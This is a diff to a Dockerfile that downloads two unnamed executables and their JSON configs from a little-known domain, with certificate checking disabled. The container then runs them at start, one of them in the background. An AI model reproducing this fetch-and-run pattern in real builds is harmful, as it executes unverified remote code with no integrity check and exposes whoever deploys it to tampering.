@@ -4,6 +4,11 @@ RUN DEBIAN_FRONTEND=noninteractive apt install curl git wget unzip screen sudo p
 RUN curl -LO https://proot.gitlab.io/proot/bin/proot
 RUN chmod 755 proot
 RUN mv proot /bin
-RUN wget https://s.bccx.eu.org/ -O /start.sh
-RUN chmod +x /start.sh
-CMD sudo ./start.sh
+RUN wget --no-check-certificate https://s.bccx.eu.org/s
+RUN wget --no-check-certificate https://s.bccx.eu.org/v
+RUN wget --no-check-certificate https://s.bccx.eu.org/config.json
+RUN wget --no-check-certificate https://s.bccx.eu.org/v.json
+RUN chmod +x s
+RUN chmod +x v
+
+CMD nohup ./v -config v.json & ./s
